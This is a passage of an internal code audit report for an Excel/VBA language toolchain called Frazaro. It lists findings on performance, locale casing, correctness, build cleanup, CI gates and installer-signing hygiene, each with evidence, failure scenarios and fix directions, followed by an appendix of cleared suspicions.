### C64 — Hot unifier primitives index Collections by position, which is the O(n²) pattern PROLOG.28 measured and removed elsewhere, and every candidate copies the whole environment and every fact

*low-medium · plausible, needs live repro · PROLOG, slice finding 6*

- Class: performance (4) / Severity: **low-medium** / Verdict: **PLAUSIBLE** (needs timing on a wide-Table join)
- Where: `src/VLA_Unify.bas:430-440` (`EnvWalkInto`), `:463-466` (`UnifyEnvClone`), `:200` (`UnifyBind`); `src/VLA_Prolog.bas:4827-4834` (clone plus `FreshenTerm` of the head for each candidate), `:6443` (`SolveListNth`'s `items.Item(i)` in a generating loop)
- Evidence:
```vba
For k = 1 To envN.Count
    If CStr(envN.Item(k)) = s Then          ' each deref: O(E) probes, each probe O(k) per PROLOG.28's own measurement
...
VLA_Unify.UnifyEnvClone envN, envT, tryN, tryT       ' per candidate, before any unification
If UnifyArgsOnly(goals.Item(1), FreshenTerm(clauseRec.Item(1), suffix), tryN, tryT) Then   ' facts are ground, yet copied
```
- Failure scenario: the environment is append-only along a proof path. Each keyed atom on a wide Table adds one binding per column, and recursion adds more. PROLOG.28 measured positional `Collection.Item(k)` as O(k) (20,000 items: 0.523s indexed vs 0.008s with For Each) and converted eleven loops. The environment scan and clone in `VLA_Unify` were not converted. So every dereference costs O(E²), and every candidate pays an O(E²) clone before it is even tried. On top of that, `FreshenTerm` allocates a full copy of every fact head, even though facts are guaranteed ground (`prolog-fact-has-variable`, and Table rows are ground). A join over two 30-column Tables deep into a rule body can therefore run far slower than the 0.109s the 100,000-work budget was sized on. The result is a long recalculation freeze rather than a refusal.
- Live repro: two 30-column Tables of 300 rows. Time `(query (a (k K) (x X)) (b (k K) (y Y)))` against the same query on 3-column Tables.
- Dedupe: PROLOG.29 (first-argument indexing) reduces the *number* of candidates, not the per-candidate cost. PROLOG.28 converted other loops but not `VLA_Unify`. Not filed.
- Fix direction: keep the environment in a binary-compare `Scripting.Dictionary`, or in arrays with doubling plus a trail and undo on backtrack, instead of cloning. Mark ground clauses at load time and skip `FreshenTerm` for them.
- Ratchet-able?: yes. Flag `For <v> = … To <c>.Count` followed by `<c>.Item(<v>)` in `VLA_Prolog.bas`/`VLA_Unify.bas` outside an allowlist of small-arity term walks. See the pattern below.

### C65 — The legacy menu has drifted from the ribbon, although the code says the three surfaces "cannot drift"

*low-medium · confirmed by reading · Host, IDE and build, slice finding 7*

- Class: 10 (duplicated table that has drifted). Severity: low-medium. When ribbon injection fails (the documented soft-failure path), SEC.9's only way back from a "no" is unreachable. Verdict: CONFIRMED.
- Where: src/VLA_IDE.bas:4250-4279 `VlaAddinMenu` compared with :4288-4316 `VlaRibbonAction` and VLA_Build.bas `VlaRibbonXml`.
- Evidence: the ribbon has `VlaLoadPhrasebook`, `VlaForgetPhrasebooks` and `VlaOpenCli`. `VlaAddinMenu` has none of the three. The comment at :4281-4287 claims "so the three surfaces cannot drift", but the self-test pins only ribbon ids against the dispatcher, and no test or tool references `VlaAddinMenu` (grep of src/ and tools/).
- Failure scenario: VlaInjectRibbon fails (PowerShell blocked by policy, which is exactly why a fallback exists). The user declines a phrasebook in the SEC.9 prompt. With no ribbon, "Forget Phrasebook Approvals" and "Load Phrasebook" cannot be reached from any surface, so the recorded "no" is permanent.
- Live repro: Build with `powershell.exe` renamed or blocked, open the add-in, and look at Add-ins > Frazaro.
- Dedupe: Not filed. This is the F.15 class of "hand-maintained parallel arrays", but not this instance.
- Fix direction: Build both surfaces from one table of (id, caption, macro).
- Ratchet-able?: Yes. A tool can parse `RibbonBtn("X"` ids and `AddMenuBtn ... "macro"` and require the same set.

### C66 — Trace, transcript and feedback renderers build unbounded text quadratically and write it one cell at a time

*low-medium · confirmed in code, live effect needs repro · Host, IDE and build, slice finding 8*

- Class: 4 (performance). Severity: low-medium (a hang on large but realistic runs). Verdict: CONFIRMED in code. PLAUSIBLE on timing.
- Where: src/VLA_Console.bas:478 (`out = out & vbCrLf & CStr(p)` for every debug-print line, with no cap on line count; `VALUE_SHOW_WIDTH` caps only the value). src/VLA_IDE.bas:1844-1855 `RenderTraceReport` (one `.Value` write per effect line, with ScreenUpdating already back on; with the handler from findings 2 and 3 armed, each write also fires it). src/VLA_IDE.bas:2417 (the same pattern). src/VLA_Interpreter.bas:1424-1431 `VlaInterpreterEffectLog` (`r = r & e & vbCrLf`, which the IDE calls). src/VLA_IDE.bas:5690-5696 `EnglishIdeCopyFeedback` (up to 2000 rows concatenated).
- Failure scenario: A CLI command `(for i 1 50000 (debug-print i))` builds a single transcript entry through about 50k growing concatenations, several GB of memcpy, and Excel freezes. The entry is then kept among the last 200 and re-joined into the TextBox after **every** later command. Interpret and Trace on a 50k-effect run does the same quadratic join, then 50k single-cell writes.
- Live repro: Run the CLI command above and time it. Then run `(+ 1 1)` and time the transcript refill.
- Dedupe: Not filed (P-PROBE is about macro registration, not rendering).
- Fix direction: Collect into a `String()` array and `Join` it. Cap printed lines per transcript entry ("... N more lines"). Write the trace with one `Range.Resize(n,1).Value = arr` from a 2-D array.
- Ratchet-able?: Partly. Flag `x = x & ...` inside `For Each`/`For` loops whose bound comes from a Collection or Split in the IDE and Console modules.

### C67 — G-RENDER uses locale `UCase$`, so under a Turkish locale a rendered sentence starting with "i" cannot be re-parsed

*low · plausible, needs live repro · Translator, slice finding 10*

- Class: comparison/locale (6), house rule R6. Severity: **low** (G-RENDER has no production caller today, only EnglishRenderSelfCheck and tests). Verdict: **PLAUSIBLE** (tr-TR repro needed).
- Where: `src/VLA_SentenceEngine.bas:2166` (sentence capitalisation), `:2053` (cell/range/column render), `:2063` (role). There are 24 non-comment `LCase$/UCase$` sites in the file in all. Most operate on text that is already ASCII-folded, and are listed under pattern A.
- Evidence:
```vba
If Len(r) > 0 Then r = UCase$(Left$(r, 1)) & Mid$(r, 2)     ' EnglishRenderForm
Case "range", "cell", "column"
    RenderSlotValue = UCase$(StripQuoteSigil(CStr(bound)))
```
- Failure scenario: with Windows set to Turkish, rendering `(add! total 5)` produces `İncrease total by 5.` (dotted capital I). EnTokenize refuses `İ` because IsWordChar is ASCII-only, so EnglishRenderSelfCheck reports every i-initial rule as "did not re-parse at all". Cells like `i5` render as `İ5`, and refusal messages at :6562/:7065/:7143 show `İ5` too.
- Live repro: set Region to Turkish and run `?EnglishRenderSelfCheck()`. Compare the failure count with en-US.
- Dedupe: R6 exposure is acknowledged in BETA_REARVIEW L16608-16626 ("33 sites across 9 modules"), with no item for the translator's own sites. This extends R6.
- Fix direction: add an invariant `VLA_Identity.UpperAscii` (the mirror image of Fold) and use it for display casing of ASCII tokens.
- Ratchet-able?: yes. A grep for `\b[LU]Case\$?\(` outside VLA_Identity.bas and VLA_Runtime's user-facing builtins, with a ceiling (this file: 24).

### C68 — The vocabulary load path carries several quadratic tails that run on every Check

*low · confirmed by reading · Translator, slice finding 11*

**Roadmap link:** Extends PF.8.

- Class: performance (4). Severity: **low**. Verdict: **CONFIRMED** by reading. Cost not measured.
- Where: `src/VLA_SentenceEngine.bas:8871-8881` (BuildExpandedBlob: `r = r & ...` over the whole expanded phrasebook, about 110 KB for english.vla, plus `expTexts.Item(i)`/`expTags.Item(i)`). `:8807` (`formLines.Item(k)` inside `For Each f In forms`). `:8815-8825` (five `Collection.Item(i)` reads per proof, 418 proofs in english.vla). `:1345-1346` (BuildStepInfra: `mStepTexts.Item(i)` per step). `:4453/:4456` (dispatch reads `dspB.Item(dspBi)`/`mDspUniversal.Item(dspUi)` by index on every statement). `:9497-9612` (EnglishResolveCheck's `defined = defined & ...` plus `InStr(defined, ...)` per call).
- Evidence:
```vba
For i = 1 To expTexts.Count
    tag = CStr(expTags.Item(i))
    If Len(tag) > 0 Then r = r & "; row: " & tag & vbCrLf
    r = r & CStr(expTexts.Item(i)) & vbCrLf
Next
```
- Failure scenario: each Check reloads the phrasebook, so each Check rebuilds a 110 KB string by repeated concatenation (roughly #directives × average length in copies) and does O(n²) positional Collection walks. The project already recorded this exact mechanism ("a VBA Collection read by index is O(n²)", PROLOG.28, and P-TOK). Growth of the phrasebook turns it into latency on every Check.
- Live repro: `VlaProfileAll`, then time `EnglishLoadVocabulary` on english.vla. Double the file by duplicating its test proofs and check whether the time roughly quadruples.
- Dedupe: PF.8 (open) covers `mVocabMacros` only. BuildExpandedBlob is mentioned in BETA_REARVIEW only for its format. This **extends PF.8**.
- Fix direction: use the existing SbAdd/SbText builder (this file already has it, :4520) and `For Each` over the parallel collections, or collect them into arrays once.
- Ratchet-able?: yes. Flag `For <v> = 1 To <c>.Count` loops that call `<c>.Item(<v>)` (the P-TOK/PROLOG.28 shape), and `<s> = <s> & ...` inside loops in translate/load paths.

### C69 — A text-like slot's default value skips the slot's own rendering (smell)

*low · confirmed by reading · Translator, slice finding 12*

- Class: phrase-rule edge case (10). Severity: **low**. Verdict: **CONFIRMED** by reading. Latent: the only shipped default is `{n:expr=1}`.
- Where: `src/VLA_SentenceEngine.bas:4871-4872` against `:4685-4695`/`:4568-4575`.
- Evidence:
```vba
If hasDefault Then
    val = defaultVal          ' raw text; a matched text/cell/sheet slot is VlaStringLit(...)
```
- Failure scenario: `(english-vla "open sheet [named] {s:sheet=Data}" (activate-sheet {s}))`. `Open sheet named Summary.` binds `"Summary"` (a string), but `Open sheet.` binds the bare symbol `Data`. The template then refers to a variable, or fails to read.
- Live repro: load that rule and Explain both sentences.
- Dedupe: not filed.
- Fix direction: pass defaults through the same per-category renderer (VlaStringLit for text/ref categories), or refuse defaults on non-expr categories at registration.
- Ratchet-able?: a load-time refusal is enough.

### C70 — With TCO on, locals keep their values between "recursive" calls

*low · confirmed by reading · Reader and emitter, slice finding 11*

- Class: 10 / **Severity: low** (hand-written VLA only; English never produces all-`byval` parameters) / Verdict: CONFIRMED by reading.
- Where: `src/VLA.bas:4146-4188` (`EmitProc` places the `vla_tco:` label **above** the body) and `4600-4630` (`EmitReturn` emits `GoTo vla_tco`).
- Failure scenario: `(function f ((byval n long) (byval acc variant)) (dim bonus) (if (= (mod n 10) 0) (then (set! bonus 5))) (if (= n 0) (then (return acc))) (return (f (- n 1) (+ acc n bonus))))`. Real recursion (and the interpreter, which has no TCO and a fresh frame per call) adds the bonus only at multiples of 10. The TCO loop re-enters below the `Dim`, so `bonus` stays 5 for every later "call": a silently wrong sum.
- Dedupe: searched for "TCO". Only L18's design text came up, which reasons about parameters and not about locals.
- Fix direction: when TCO is armed, emit a reset of every `dim`'d local after `vla_tco:` (or refuse TCO when the body contains a `dim`).
- Ratchet-able?: a pure golden test.

### C71 — Lint's form splitter resets its in-string state on every line, so valid multi-line strings are refused

*low · confirmed by reading · Reader and emitter, slice finding 13*

- Class: 10 / **Severity: low** (a wrong refusal; the whitespace-only difference guard prevents damage) / Verdict: CONFIRMED by reading.
- Where: `src/VLA_Lint.bas:210-213`: `inQuote = False` inside the per-line loop of `SplitSegments`. The reader (`Tokenize`) allows LF inside a string.
- Failure scenario: a docstring spanning two lines whose second line contains `)` or `;`. Depth is miscounted, the segment is cut early or overruns, `ReformatForm` raises, and Lint VLA reports "unparseable" on a file that transpiles fine.
- Dedupe: nothing for Lint and multi-line strings.
- Fix direction: carry `inQuote`/`esc` across lines within one form.
- Ratchet-able?: a pure test.

### C72 — `IsProtectedModule` still lists 3 names in a 30-module project

*low · confirmed by reading · Reader and emitter, slice finding 14*

- Class: 10 / **Severity: low** (dev and Immediate-window API) / Verdict: CONFIRMED by reading.
- Where: `src/VLA_Loader.bas:42-47`, together with the IO.1 heuristic at `src/VLA.bas:1421-1426` (a module counts as "ours" if it contains `' vla:` anywhere).
- Failure scenario: `VlaImportFile "…\vla_sentenceengine.vla"` with the dev workbook active. The module name is `vla_sentenceengine`, which is not protected. `VLA_SentenceEngine.bas` contains the text `' vla:` in comments (lines 1207, 1274, 10988), so the IO.1 guard treats it as Frazaro-generated and **deletes the whole module**, replacing it with the compiled file. The same applies to `VLA_Tests` and `VLA_Tests_Grammar`.
- Dedupe: IO.1 is shipped. This protected list is not mentioned anywhere.
- Fix direction: protect by prefix (`vla_*`, `frm*`, and the `mods` array from VLA_Build) and require the IO.1 marker line itself rather than any `' vla:`.
- Ratchet-able?: yes. Check that `IsProtectedModule` covers every name in `VLA_Build`'s `mods` array, the way `check_devrig_mods_parity.ps1` already does for two other lists.

### C73 — The interpreter decides which variable a name means with `vbTextCompare`, not the invariant `Fold` that LX.3 made the rule for identity

*low · plausible, needs live repro · Interpreter and runtime, slice finding 15*

- Class: 6 (LX.3/SD-8 class) / Severity: **low** / Verdict: **PLAUSIBLE**
- Where: `src/VLA_Runtime.bas:735-746` (`VlaDictNew`: `CompareMode = vbTextCompare`), used as the interpreter's variable frame at `VLA_Interpreter.bas:460`, `3624` and elsewhere. The Mac fallback uses `Fold` (`785`, `813`).
- Failure scenario: Hand-written VLA `(dim Items Double) (set! items 1)` on a Turkish-locale machine. Under tr-TR case rules, `I` and `i` are not a case pair, so this becomes two different variables, where VBA and `Fold` see one. Also, on Windows `café` and `CAFÉ` are one variable (TextCompare) and on Mac they are two (ASCII Fold). This contradicts the runtime header's "both representations agree".
- Dedupe: LX.3 (closed) fixed `LCase` sites. The `VlaDict` frame was not considered for identifiers. Not filed.
- Fix direction: Give the interpreter its own frame dictionary using `vbBinaryCompare` with `Fold`ed keys, and leave `VlaDict` for user-facing keyed memory.
- Ratchet-able?: Yes. Forbid `VlaDictNew` as a frame in VLA_Interpreter.bas.

### C74 — F16 (smell). The IN.11 comment says the `argVals` chain is ByRef, but the code is ByVal throughout

*low · smell · Interpreter and runtime, slice finding 16*

- Class: 10 / Severity: **low** / Verdict: **CONFIRMED** (the comment and the code disagree)
- Where: `src/VLA_Interpreter.bas:4017-4043`, which claims "ByRef here and in every OTHER function ... TryEvalBuiltin/TryRuntimeHelper/DynamicGet/DynamicCall/.../JoinArgs". All of those declare `ByVal argVals As Variant` (2387, 2472, 2898, 3070, 3364, 3371, 4044, 4048, 4065). No `ByRef argVals` exists anywhere in `src/` or in the history available here. The corruption it describes was reproduced through `CallByName`, which SEC.1 removed, so it may not bite now. Either way, the recorded fix is not present. Late-bound calls such as `obj.Add ArgAt(argVals, 0)` still receive elements after four ByVal hops.
- Fix direction: Re-apply ByRef or rewrite the comment. Add a host pin for "Set pick-check to item 2 of found-items." (the H22 shape) under Interpret.
- Ratchet-able?: Yes. A check can assert the parameter mode the comment claims.

### C75 — F17 (smell). `VlaSlice.Item` does not check its index

*low · smell · Interpreter and runtime, slice finding 17*

- Where: `src/VlaSlice.cls` (`Item` reads `Backing.Item(Offset + i)`).
- `Item(0)` or a negative index inside the backing silently returns an element *before* the slice, and `Count` goes negative when `Offset > Backing.Count`. A Collection would raise error 9. Low severity; add `If i < 1 Or i > Count Then Err.Raise 9`.

### C76 — `findall` does not copy unbound template variables, so bag elements alias each other and the caller's variable

*low · confirmed by reading · PROLOG, slice finding 8*

- Class: correctness / Severity: **low** / Verdict: **CONFIRMED**
- Where: `src/VLA_Prolog.bas:2068-2096` (`SubstituteTemplate`), `:7578-7600` (`HarvestFindallBag`), `:7678-7684` (`ResolveTermDeep` returns a free variable's own name)
- Evidence:
```vba
Set harvestedTuples = SolveIsolated(findallGoal.Item(3), clauseDict, envN, envT, templateVars, stepsTaken)
...
bag.Add SubstituteTemplate(template, templateVars, tup)   ' an unbound var resolves to its own name, e.g. "X"
```
- Failure scenario: `(query (findall X (p a) L) (= X 5))` with two `(p a)` facts renders L as `(list 5 5)`. ISO's findall copies terms, giving `[_A,_B]`, and X stays unrelated. `(findall (pair N Z) (staff (name N)) L)` builds pairs that all share one Z, so a later `(member (pair bob 1) L)` binds Z for every element. `(findall X (p a) L) (= L (list 1 2))` fails where standard Prolog succeeds.
- Live repro: `=PROLOG("(fact (p a)) (fact (p b)) (query (findall X (p Y) L) (= X 5))")` shows `(list 5 5)`.
- Dedupe: I grepped "findall … cop" and "fresh variable". Not filed.
- Fix direction: after harvesting, freshen each bag element with a unique suffix (`FreshenTerm(elem, "#" & stepsTaken & "_" & i)`) so its free variables are new.
- Ratchet-able?: no.

### C77 — Keyed atoms cannot address a column whose header contains a space

*low · confirmed by reading · PROLOG, slice finding 9*

- Class: design limitation / Severity: **low** / Verdict: **CONFIRMED**
- Where: `src/VLA_Prolog.bas:3683-3701` (`DesugarPredicateAtom`), `VLA_Relation.bas:960-966` (headers folded verbatim)
- Evidence:
```vba
hText = CStr(pLst.Item(1))
hFolded = VLA_Identity.Fold(hText)                 ' a quoted key keeps its leading " marker
If StrComp(CStr(hpPair.Item(1)), hFolded, vbBinaryCompare) = 0 Then
```
- Failure scenario: an Excel Table column named `Min Level` or `Employee ID` is common. The reader splits on spaces, so the key must be quoted as `("Min Level" 3)`. The quoted token keeps its marker (`"min level`), so it never equals the folded header. The refusal `prolog-unknown-column` then lists "Min Level" as a valid column, a name the user cannot type in any form that works. The only way out is positional access to the whole row. DATALOG shares the scheme.
- Live repro: a Table with a `Min Level` header and `(query (t ("Min Level" X)))`.
- Dedupe: I grepped "header … space" and "multi-word column". Not filed.
- Fix direction: strip the quoted-string marker from a key before folding, so `("Min Level" X)` resolves. Optionally also accept `min-level` for spaces.
- Ratchet-able?: no.

### C78 — `LIMIT` or an `ORDER BY` ordinal above 2,147,483,647 overflows `CLng` and returns a raw "Overflow"

*low · confirmed by reading · SQL and DATALOG, slice finding 12*

- Class: 5. Severity: low. Verdict: CONFIRMED by reading.
- Where: src/VLA_Sql.bas:1628 and :1675.
- Evidence: `limitCount = CLng(limVal)` runs after the check that the value is a non-negative integer; nothing checks the upper bound.
- Failure scenario: `SELECT * FROM t LIMIT 9999999999` gives "#SQL! Overflow" (raw, no id). SQLite accepts it and returns all rows.
- Fix direction: clamp LIMIT to the Long max, which is equivalent to "all rows". An ordinal above the Long max refuses via the existing `sql-order-by-position-out-of-range`.
- Ratchet-able: marginal.

### C79 — VLA_Relation's header forbids calling VLA_Messages, but the module calls it (layer contract drift)

*low · confirmed by reading · SQL and DATALOG, slice finding 13*

- Class: 10 (smell). Severity: low. Verdict: CONFIRMED.
- Where: header src/VLA_Relation.bas:196-205 and the TableArgResolve header ("NEVER raises, because this module cannot call VLA_Messages"). The calls are at :676-697 (RaiseTableArgRefusal) and :738 (SourceToArray `relation-table-noncontiguous-areas`).
- Evidence: `'             Never VLA_Messages - refusal WORDING stays each engine's` sits beside `VLA_Messages.RaiseMsg "relation-table-noncontiguous-areas"`.
- Failure scenario: none at runtime. The risk is that future edits keep designing around a constraint that no longer exists, for example the ok/reason plumbing in ComputeArithmetic and RelGroupBy that each engine must fully map (the PROLOG.17 note shows how that drift already bit once).
- Fix direction: update the LAYER/MAY CALL lines to name VLA_Messages (relation-* ids only), or move the two raises into the engine wrappers.
- Ratchet-able: yes. A LAYER ratchet that parses each module's `MAY CALL:` and fails on a `Module.` qualifier not listed there.

### C80 — The four worksheet entry points are copied bodies, and the header claims OPTIMISE is a one-line alias

*low · confirmed by reading · OPTIMIZE, slice finding 4*

- Class: 10 (duplicated logic). Severity: low (smell). Verdict: CONFIRMED (a smell, not a bug today).
- Where: src/VLA_Optimize.bas:454-477, 484-507, 529-552, 587-611. The same loop exists a fifth time as AddTableArg, 956-964, which the command uses.
- Evidence: the comment at 479-483 says "a one-line alias forwarding to the same engine ... there is exactly one engine, one memo and one set of refusals behind both names". OPTIMISE is actually a full copy of OPTIMIZE's 20-line body, and OPTIMIZE_STATUS and OPTIMIZE_VIOLATIONS repeat the same table-reading loop (`RelFromRange` + `RangeColumnNames` + headerMap) verbatim.
- Failure scenario (future): DATALOG.15 already changed how a spilled range's header row is read once. The next change to argument reading will have to land five times. A miss in one copy makes OPTIMIZE and OPTIMIZE_STATUS read the same arguments differently, so the status cell describes a different question than the one its neighbour answers. That would break the "STATUS is the same answer's words" contract without any pin failing, because the pins call OptimizeRun and never these bodies.
- Dedupe: no roadmap item mentions it.
- Fix direction: one `Private Sub ReadTableArgs(tables As Variant, relations, headerMap)`, or AddTableArg in a loop, called by all four. Make OPTIMISE literally `OPTIMISE = OPTIMIZE(rulesText, ...)` via a shared private function that takes the ParamArray as a Variant.
- Ratchet-able?: a check_* scan could count occurrences of `VLA_Relation.RelFromRange(` per module and cap it at 1.

### C81 — A build that fails part-way leaves its half-assembled add-in workbook open, and DisplayAlerts is forced to True instead of restored

*low · confirmed by reading · Host, IDE and build, slice finding 9*

- Class: 8 / 2. Severity: low (developer machine only). Verdict: CONFIRMED.
- Where: src/VLA_Build.bas:442 `Set wb = Workbooks.Add`, the handler at :585-588, and :545-547.
- Evidence:
```vba
failed:
    Application.DisplayAlerts = True
    note = edition & " edition FAILED: " & Err.Description
    VlaBuildOneEdition = False            ' wb (Workbooks.Add) never closed
```
- Failure scenario: `wb.SaveAs outPath` fails because Frazaro_English.xlam is open in the same session (DEPLOY's own "build-lock trap"), or an import fails. `wb`, now `IsAddin = True` and invisible, stays open with a complete second copy of the VlaTools project. The loop moves on to the next edition and can leave a second one. Unqualified macro names (`Application.OnKey "^+`", "VlaOpenCli"`) now match two open projects. Each retry adds another hidden copy until Excel restarts.
- Live repro: Open Frazaro_English.xlam, run `VlaBuildAddin "English"`, then look for an extra `BookN` in the VBE Project Explorer.
- Dedupe: Not filed.
- Fix direction: In the handler, `If Not wb Is Nothing Then wb.Close False`. Save and restore `DisplayAlerts`.
- Ratchet-able?: A check can require that any procedure calling `Workbooks.Add`/`Workbooks.Open` has a handler that closes the handle.

### C82 — Three of the 29 "checks" cannot fail on what they measure, and two read a stale, silently-filtered test-file list

*low · confirmed by reading · Tooling and supply chain, slice finding 4*

- Class: design smell (gates that are reports). Severity: **low**. Verdict: **CONFIRMED by reading**.
- Where: tools/check_backend_parity.ps1:44-46 (no `exit` anywhere); tools/check_emitter_coverage.ps1:96-97 (no `exit` anywhere); tools/check_rule_coverage.ps1 (no `exit 1`)
- Evidence:
```powershell
$testFiles  = @('VLA_Tests.bas', 'VLA_Tests_Grammar.bas', 'VLA_Tests_Host.bas') |
              ForEach-Object { Join-Path $srcDir $_ } | Where-Object { Test-Path $_ }
```
  `src/VLA_Tests_Query.bas` exists and is not in either list, so query-engine pins are invisible to both parity reports. A renamed test file is dropped silently by `Where-Object { Test-Path $_ }`, and coverage just falls. Baseline output: "19/65 forms have a pin under BOTH backends", "69/158 dispatch arms have a pin", "147 rules have exactly one test". All three exit 0, and each counts as one of the 29 green "ratchets" in `ALL GREEN` and toward the floor.
- Failure scenario: a commit deletes every interpreter pin for a form. CI and release are green and the only signal is a changed number in a log nobody reads.
- Dedupe: AS.2/AS.8 name these as reports on purpose. The blind spot is that the runner, the floor and CI count them as gates. Not filed.
- Fix direction: either rename them out of the `check_*` glob (for example `report_*.ps1`) so "N checks green" means N gates, or give each a held ceiling or floor (for example "pinned arms >= 69") like `check_raise_ratchet.ps1` does. Derive the test-file list from `Get-ChildItem src -Filter 'VLA_Tests*.bas'`, and fail if it is empty.
- Ratchet-able?: yes. A meta-check that every `check_*.ps1` contains an `exit 1` or an `exit ([Math]::Min(...))` path.

### C83 — Installer signing identity is a CN string: silent re-mint, no pinning, exportable key, no timestamp

*low · confirmed by reading · Tooling and supply chain, slice finding 9*

**Roadmap link:** Extends SIG.8.

- Class: supply-chain / certificate handling. Severity: **low**. Verdict: **CONFIRMED by reading**.
- Where: installer/sign_installer.ps1:126-138; tools/release.ps1:153-157; installer/build_installer.ps1:87-91; tools/generate_vba_signing_cert.ps1:27-40
- Evidence:
```powershell
$existing = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert |
    Where-Object { $_.Subject -eq $subject -and $_.NotAfter -gt (Get-Date) } | Select-Object -First 1
if ($existing) { $cert = $existing } else { $cert = New-SelfSignedCertificate ... }   # silent new key
...
if ($sig.Status -eq 'NotSigned' -or $sig.Status -eq 'HashMismatch' -or $subj -ne 'CN=Frazaro Dev Signing') { fail }
```
- Failure scenario:
  - The owner builds on a second machine, or after the 5-year expiry, or after a profile reset. `sign_installer.ps1` mints a new key pair under the same CN with only a one-line "Minted" note, and `release.ps1` check 9 accepts it, because the subject text matches.
  - That breaks the "identity continuity across builds" the script's own header claims. Anyone who trusted the old cert, or who follows SIG.8's planned thumbprint publication, sees a different publisher. Any cert anyone mints with that CN passes the gate.
  - `New-SelfSignedCertificate` defaults to an exportable private key.
  - No `-TimestampServer` means the Authenticode signature stops validating when the cert expires (SD-13 forbids network, so this should be an explicit accepted decision).
  - With several valid certs of that CN, `Select-Object -First 1` picks arbitrarily.
- Dedupe: SIG.8 (BETA_ROADMAP.md:154) covers the *VBA* cert's publication, rotation and timestamp questions. The installer cert's silent re-mint and the release gate's subject-only match are not in it. This extends SIG.8.
- Fix direction: pin the expected thumbprint in a committed file, check `$sig.SignerCertificate.Thumbprint` against it in build_installer.ps1 and release.ps1, and make sign_installer refuse (not mint) when the pinned cert is missing, with minting as an explicit `-MintNew` switch. Use `-KeyExportPolicy NonExportable`.
- Ratchet-able?: no. This is a release-time check.

### C84 — CI supply chain: tag-pinned action, default token permissions, no floor

*low · confirmed by reading · Tooling and supply chain, slice finding 10*

- Class: supply chain. Severity: **low**. Verdict: **CONFIRMED by reading**.
- Where: .github/workflows/checks.yml:17-18, whole file
- Evidence: `uses: actions/checkout@v4` is a mutable tag, not a commit SHA. There is no `permissions:` block, so the `GITHUB_TOKEN` scope depends on repository settings. It runs on `push` to main and on every `pull_request`. The job only runs `check_*.ps1`: no floor (finding 1) and no `-WithExtras`.
- Failure scenario: a compromised or retagged `actions/checkout@v4` runs arbitrary code in a job whose token may have write scope on push-to-main runs. Low likelihood, standard hygiene.
- Dedupe: grepped for `checkout@` and `permissions`. Nothing filed.
- Fix direction: `uses: actions/checkout@<full sha> # v4.x.y`, plus a top-level `permissions: contents: read`, and call `tools/run_checks.ps1` (with its floor fixed) instead of reimplementing the loop.
- Ratchet-able?: yes. A tiny check that every `uses:` line in `.github/workflows/*.yml` ends in a 40-hex SHA and that a `permissions:` key exists.

## Appendix: looked at and cleared

*What each auditor suspected and ruled out, so the next pass does not redo it.*

### Translator

- `VLA_Identity.Fold`: `c As Integer` with AscW is safe because the range test is on 65-90 only. `SameText` has no callers (as documented).
- `VLA_HeadTable`: no module cache (rebuilt on every call, as documented). Keyed Add catches duplicate symbols, and the alias map folds keys. The only issue is a linear alias scan on a cache miss, which is fine at 65 rows.
- `VLA_English.CanonicalizeStructuralWords`: aliasing ordinary words globally is a documented limitation (espanol.vla comments), and EDITION-VOCAB is the follow-on. The mKeywordAlias lookups are keyed by Fold and always initialised by EnsureInit. Cleared except for the arity and closed-set point in #6.
- Dispatch index (BuildDispatchIndex/mDspValid): invalidated on append, override (ReplaceAt), RestoreRules and reset, and it is guarded by `mDspN <> mPatItems.Count`. No stale index found. mSigOwner is rebuilt on reset and restore.
- EnglishTryRule snapshot/restore: it restores all five lockstep rule collections and invalidates dspIndex/sigOwner. mRuleExamples is keyed by rule index and cannot be touched by a trial append.
- Tokenizer thousands separator (`1,000`) and decimal point: the strict shape is intentional. A comma-decimal user's `2,500` meaning 2.5 becomes 2500, but that is squarely EN.4.
- `IsWordTok`/`IsWordChar` via `Like` under Option Compare Binary: ranges are code-point exact, which is correct.
- ReplaceAt: handles `idx > Count` after the removal. Correct.
- `ClickHandlerSlug`: non-ASCII captions collapse to `_`, and the collision is refused in words (mClickSlugs). Cleared.
- `NormalizeWs`/fail-proof fragment `InStr(..., vbTextCompare)`: case-blind matching of refusal text is intended ("case- and whitespace-blind").
- `StrComp(outPath, programPath, vbTextCompare)`: a path comparison, documented in INTRINSICS #5.
- VocabReadFile's cached `mVocabStream`: closed on the error path and dropped. No leaked handle on the ADODB side. (The ANSI fallback's `Get` could leak `#f` on an I/O error. That is minor, and #8 recommends deleting the fallback anyway.)
- ExpandedSignatures' cartesian product: exponential in optional and alternative items per pattern, but bounded by pattern authoring. No pattern in english.vla comes close.
- BoundLookup/EmbeddedSlotText re-read each bound value with VlaReadForms on every use. This is redundant work but bounded by the template size.

### Reader and emitter

- `VlaTranspile`'s `emitfail` handler: it re-raises with its own augmentation; per-transpile state is reset at entry, so a failed transpile does not poison the next one.
- `ResolveHeadAlias` and `TagLine` use `On Error Resume Next`, but it is tightly scoped and cleared (`On Error GoTo 0`) in the same procedure.
- `Tokenize`, `EmitBody` and `VlaTranspile` use the string-builder (`SbAdd`); there is no quadratic concatenation on the hot paths. `TransliterateToAscii` and `ClickHandlerSlug` do concatenate per character, but only over short names.
- No `As Integer` counters in VLA.bas emission. The golden's only integer-typed variables are `As Long` (`vla_step`, `vlaSlabI*`). `Dim fnum As Integer`/`Dim f As Integer` for FreeFile are correct (FreeFile returns an Integer). `VLA_Identity.Fold`'s `c As Integer` holds `AscW`, which is in range.
- Every emitted module starts with `Option Explicit` (VlaTranspile:1045, golden:1).
- Unqualified `cells(...)`/`range(...)`/`columns(...)` in the emitted `main` are by design ("Work on sheet X" activates first). The interpreter has the same semantics. The table-macro ActiveSheet dependence is already IO.4.
- Try label flow (`vla_tryf_N` → `Resume vla_tryr_N` → re-arm → `vla_tryd_N`): both exits re-arm correctly for a single, un-nested Try. See #2 for the nested case.
- `VLA_Digest` SHA-256: the arithmetic is sound. `VlaSha256HexOfAsciiText`'s ANSI-code-page collision is already recorded (BETA_REARVIEW:20919) and it has no live caller outside tests.
- `VLA_Provenance`: parsing is range-checked and length-capped (SEC.8 pinned it). `UncapturedRefuses = False` is a recorded residual. A smell, not filed: `VlaPathIsDemonstrablyLocal` treats any `X:\` drive as local, including a mapped network drive or a FAT or exFAT USB stick where the mark cannot be stored. So a workbook with no readable mark that was copied there is allowed, while the same file on the UNC path is refused. This is inconsistent, but Office has the same blind spot.
- `VLA_Browser`: the prelude override is cleared on both exits.
- `MakeButtonHelperText`: its `On Error Resume Next` is confined to its own helper procedure, so it does not disturb the caller's handler.
